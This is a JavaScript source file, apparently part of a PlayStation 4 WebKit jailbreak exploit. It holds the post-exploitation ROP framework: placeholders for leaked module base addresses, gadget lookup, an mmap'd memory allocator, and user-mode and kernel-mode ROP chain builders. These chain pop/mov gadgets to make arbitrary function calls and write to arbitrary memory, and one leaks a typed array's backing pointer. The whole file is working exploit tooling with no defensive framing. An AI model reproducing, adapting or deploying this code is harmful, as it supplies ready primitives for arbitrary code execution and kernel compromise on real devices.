/* Leave these values untouched, they will be set properly post-exploitation */
var moduleBaseAddresses =
{
  'libkernel': 0,
  'libSceWebKit2': 0,
  'libSceLibcInternal': 0
};

/* Simply adds given offset to given module's base address */
function getGadget(moduleName, offset)
{
  return moduleBaseAddresses[moduleName].add32(offset);
}

var memory = function(p, address)
{
  this.basePtr = address
  this.dataPtr = 0;

  /* Return a pointer in mmap'd memory */
  this.allocate = function(size)
  {
    /* Prevent buffer overflow / pagefault */
    if(this.dataPtr > 0x10000 || this.dataPtr + size > 0x10000)
    {
      return -1;
    }

    var memAddr = this.basePtr.add32(this.dataPtr);

    this.dataPtr += size;

    return memAddr;
  };

  /* Clears all data by zeroing out this.data and resetting count */
  this.clear = function()
  {
    for(var i = 0; i < 0x10000; i += 8)
    {
      p.write8(this.basePtr.add32(i), 0);
    }
  };

  /* Zero out our data buffer before returning a storage object */
  this.clear();

  return this;
};

/* Called to start a kernel ROP chain */
var krop = function(p, addr) {
  this.chainPtr = addr;
  this.count = 0;

  this.push = function(val)
  {
    p.write8(this.chainPtr.add32(this.count * 8), val);
    this.count++;
  };

  this.write64 = function (addr, val)
  {
    this.push(window.gadgets["pop rdi"]);
    this.push(addr);
    this.push(window.gadgets["pop rax"]);
    this.push(val);
    this.push(window.gadgets["mov qword ptr [rdi], rax"]);
  }

  return this;
};

/* Called to start a new ROP chain */
var rop = function(p, addr) {
  this.ropChain = undefined;
  this.ropChainPtr = undefined;

  if(addr == undefined)
  {
    this.ropChain    = new Uint32Array(0x4000);
    this.ropChainPtr = p.read8(p.leakval(this.ropChain).add32(0x28));
  }
  else
  {
    this.ropChainPtr = addr;
  }

  this.count = 0;

  /* Clears the chain */
  this.clear = function()
  {
    this.count = 0;
    this.runtime = undefined;

    for(var i = 0; i < 0x4000 - 0x8; i += 8)
    {
      p.write8(this.ropChainPtr.add32(i), 0);
    }
  };

  /* Gets the current chain index and increments it */
  this.getChainIndex = function()
  {
    this.count++;
    return this.count-1;
  }

  /* Pushes a gadget or value on the stack */
  this.push = function(val)
  {
    p.write8(this.ropChainPtr.add32(this.getChainIndex() * 8), val);
  }

  /* Writes a 64-bit value to given location */
  this.push64 = function(where, what)
  {
    this.push(window.gadgets["pop rdi"]);
    this.push(where);
    this.push(window.gadgets["pop rsi"]);
    this.push(what);
    this.push(window.gadgets["mov qword ptr [rdi], rsi"]);
  }

  /* Sets up a function call into a module by address */
  this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9)
  {
    if(rdi != undefined)
    {
      this.push(window.gadgets["pop rdi"]);
      this.push(rdi);
    }

    if(rsi != undefined)
    {
      this.push(window.gadgets["pop rsi"]);
      this.push(rsi);
    }

    if(rdx != undefined)
    {
      this.push(window.gadgets["pop rdx"]);
      this.push(rdx);
    }

    if(rcx != undefined)
    {
      this.push(window.gadgets["pop rcx"]);
      this.push(rcx);
    }

    if(r8 != undefined)
    {
      this.push(window.gadgets["pop r8"]);
      this.push(r8);
    }

    if(r9 != undefined)
    {
      this.push(window.gadgets["pop r9"]);
      this.push(r9);
    }

    this.push(rip);
    return this;
  }

  /* Sets up a return value location*/
  this.saveReturnValue = function(where)
  {
    this.push(window.gadgets["pop rdi"]);
    this.push(where);
    this.push(window.gadgets["mov qword ptr [rdi], rax"]);
  }

  /* Loads the ROP chain and initializes it */
  this.run = function()
  {
    var retv = p.loadchain(this);
    this.clear();

    return retv;
  }

  return this;
};
